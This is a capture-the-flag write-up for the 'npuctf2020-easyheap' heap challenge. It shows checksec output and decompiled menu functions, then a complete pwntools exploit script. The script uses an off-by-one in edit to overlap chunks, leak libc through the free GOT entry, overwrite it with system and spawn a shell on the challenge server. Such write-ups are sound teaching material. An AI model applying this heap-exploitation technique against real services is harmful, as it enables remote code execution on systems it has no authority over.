# BUU-npuctf2020-easyheap

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## IDA

**create**

```c
unsigned __int64 create()
{
  __int64 v0; // rbx
  int i; // [rsp+4h] [rbp-2Ch]
  size_t size; // [rsp+8h] [rbp-28h]
  char buf[8]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !*((_QWORD *)&heaparray + i) )
    {
      *((_QWORD *)&heaparray + i) = malloc(0x10uLL);
      if ( !*((_QWORD *)&heaparray + i) )
      {
        puts("Allocate Error");
        exit(1);
      }
      printf("Size of Heap(0x10 or 0x20 only) : ");
      read(0, buf, 8uLL);
      size = atoi(buf);
      if ( size != 24 && size != 56 )
        exit(-1);
      v0 = *((_QWORD *)&heaparray + i);
      *(_QWORD *)(v0 + 8) = malloc(size);
      if ( !*(_QWORD *)(*((_QWORD *)&heaparray + i) + 8LL) )
      {
        puts("Allocate Error");
        exit(2);
      }
      **((_QWORD **)&heaparray + i) = size;
      printf("Content:");
      read_input(*(_QWORD *)(*((_QWORD *)&heaparray + i) + 8LL), size);
      puts("Done!");
      return __readfsqword(0x28u) ^ v5;
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

**edit**

```c
unsigned __int64 edit()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *((_QWORD *)&heaparray + v1) )
  {
    printf("Content: ");
    read_input(*(_QWORD *)(*((_QWORD *)&heaparray + v1) + 8LL), **((_QWORD **)&heaparray + v1) + 1LL);
    puts("Done!");
  }
  else
  {
    puts("How Dare you!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

**show**

```c
unsigned __int64 show()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *((_QWORD *)&heaparray + v1) )
  {
    printf(
      "Size : %ld\nContent : %s\n",
      **((_QWORD **)&heaparray + v1),
      *(const char **)(*((_QWORD *)&heaparray + v1) + 8LL));
    puts("Done!");
  }
  else
  {
    puts("How Dare you!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

**dele**

```c
unsigned __int64 delete()
{
  int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *((_QWORD *)&heaparray + v1) )
  {
    free(*(void **)(*((_QWORD *)&heaparray + v1) + 8LL));
    free(*((void **)&heaparray + v1));
    *((_QWORD *)&heaparray + v1) = 0LL;
    puts("Done !");
  }
  else
  {
    puts("How Dare you!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

利用`edit`中的`off-by-one`造成`chunk overlapping`修改指针，从而改写`got`表。

## exp

```python
from pwn import *
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"

local=0
binary='./npuctf_2020_easyheap'
#gdb.attach(sh)
if local:
	context.log_level="DEBUG"
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',29293)

elf = ELF(binary,checksec=False)
libc = ELF('./libc-2.27.so',checksec=False)
one=[0x4f2c5,0x4f322,0x10a38c]
puts_got = elf.got['puts']
free_got = elf.got['free']

def add(size, content):
    sh.recvuntil(' :')
    sh.sendline('1')
    sh.sendlineafter(') : ', str(size))
    sh.sendafter('Content:', str(content))

def edit(idx, content):
    sh.recvuntil(' :')
    sh.sendline('2')
    sh.sendlineafter('ndex :', str(idx))
    sh.sendafter('Content:', str(content))

def show(idx):
    sh.recvuntil(' :')
    sh.sendline('3')
    sh.sendlineafter('ndex :', str(idx))

def free(idx):
    sh.recvuntil(' :')
    sh.sendline('4')
    sh.sendlineafter('ndex :', str(idx))

add(0x18,'1'*8) #0
add(0x18,'2'*8) #1
add(0x18,'/bin/sh\x00') #2
edit(0, '\x00'*0x18+'\x41')
free(1)
add(0x38,'4'*8*3+p64(0x21)+p64(0x38)+p64(free_got)) #1
#gdb.attach(sh)
show(1)

free_addr=u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
leak('free',free_addr)
libcbase = free_addr-libc.sym['free']
free_hook = libcbase+libc.sym['__free_hook']
system = libcbase+libc.sym['system']
leak('libc base',libcbase)
one_gadget = libcbase+one[2]
edit(1,p64(system))
free(2)

sh.interactive()
```

